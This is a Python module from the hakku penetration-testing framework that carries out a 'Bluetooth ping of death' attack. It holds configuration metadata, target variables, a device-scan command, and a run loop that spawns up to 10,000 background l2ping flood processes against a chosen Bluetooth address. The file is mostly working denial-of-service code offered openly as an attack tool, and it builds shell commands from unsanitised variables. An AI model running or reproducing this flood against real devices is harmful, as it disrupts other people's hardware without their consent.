# Copyright (C) 2015 – 2021 Noa-Emil Nissinen (4shadoww)

from core.hakkuframework import *
import os
import subprocess
import time

conf = {
    "name": "bluetooth_pod",
    "version": "1.0",
    "shortdesc": "bluetooth ping of death",
    "github": "4shadoww",
    "author": "4shadoww",
    "email": "4shadoww0@gmail.com",
    "initdate": "24.2.2016",
    "lastmod": "29.12.2016",
    "apisupport": False,
    "needroot": 1,
    "dependencies": ["xterm", "hcitool", "l2ping"]

}


# List of variables
variables = OrderedDict((
    ('interface', ['hci0', 'interface']),
    ('bdaddr', ['none', 'target bluetooth address']),
    ('size', ['600', 'size of packets (default 600)']),
))

# Custom commands
customcommands = {
    'scan': 'scan for devices'
}

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
    printInfo("bluetooth ping of death attack started...")
    try:
        for i in range(1, 10000):
            xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            time.sleep(3)
    except(OSError):
        printError("something went wrong!")


def scan(args):
    os.system("hcitool scan")
